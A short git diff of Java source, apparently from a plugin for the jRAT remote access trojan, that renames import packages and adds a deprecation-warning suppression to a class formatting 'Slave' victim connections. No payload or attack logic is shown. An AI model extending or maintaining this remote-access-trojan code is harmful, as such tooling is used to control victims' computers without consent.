@@ -4,17 +4,18 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 
-import org.jrat.project.api.Connection;
-import org.jrat.project.api.IReader;
-import org.jrat.project.api.IWriter;
-import org.jrat.project.api.PacketBuilder;
-import org.jrat.project.api.Queue;
-import org.jrat.project.api.RATObject;
+import pro.jrat.api.Connection;
+import pro.jrat.api.IReader;
+import pro.jrat.api.IWriter;
+import pro.jrat.api.PacketBuilder;
+import pro.jrat.api.Queue;
+import pro.jrat.api.RATObject;
 
 import com.redpois0n.Main;
 import com.redpois0n.Slave;
 import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
 
+@SuppressWarnings("deprecation")
 public class RATObjectFormat {
 
 	public static RATObject format(final Slave s) {
